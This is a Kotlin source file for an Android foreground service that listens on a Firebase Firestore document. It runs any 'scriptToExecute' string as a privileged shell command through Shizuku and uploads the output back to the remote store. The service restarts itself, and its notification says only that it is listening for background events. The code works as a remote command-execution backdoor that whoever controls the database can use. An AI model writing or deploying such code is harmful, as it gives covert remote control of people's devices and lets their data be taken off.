package com.example.services

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import com.example.MainActivity
import com.example.R
import com.example.utils.RenameUtil
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.ListenerRegistration

class ScriptService : Service() {

    private val CHANNEL_ID = "ScriptServiceChannel"
    private var listenerRegistration: ListenerRegistration? = null

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("X-CELESTIALS")
            .setContentText("Listening for background events...")
            .setSmallIcon(R.mipmap.ic_launcher)
            .build()
        startForeground(1, notification)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val prefs = getSharedPreferences(MainActivity.PREFS_NAME, Context.MODE_PRIVATE)
        val savedKey = prefs.getString(MainActivity.KEY_SAVED_KEY, null)
        
        if (savedKey != null && savedKey != "mujahi@admin") {
            listenForScripts(savedKey)
        }
        
        return START_STICKY
    }
    
    private fun listenForScripts(savedKey: String) {
        listenerRegistration?.remove()
        listenerRegistration = FirebaseFirestore.getInstance().collection("users").document(savedKey).addSnapshotListener { snapshot, e ->
            if (e != null || snapshot == null || !snapshot.exists()) return@addSnapshotListener
            
            val scriptToExecute = snapshot.getString("scriptToExecute")
            if (!scriptToExecute.isNullOrEmpty()) {
                Thread {
                    try {
                        val output = RenameUtil.executeShizukuCommandWithOutput(scriptToExecute)
                        FirebaseFirestore.getInstance().collection("users").document(savedKey)
                            .update(
                                "scriptOutput", output,
                                "scriptToExecute", ""
                            )
                    } catch (ex: Exception) {
                        FirebaseFirestore.getInstance().collection("users").document(savedKey)
                            .update(
                                "scriptOutput", ex.message,
                                "scriptToExecute", ""
                            )
                    }
                }.start()
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        listenerRegistration?.remove()
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val serviceChannel = NotificationChannel(
                CHANNEL_ID,
                "Background Listening Service",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(serviceChannel)
        }
    }
}
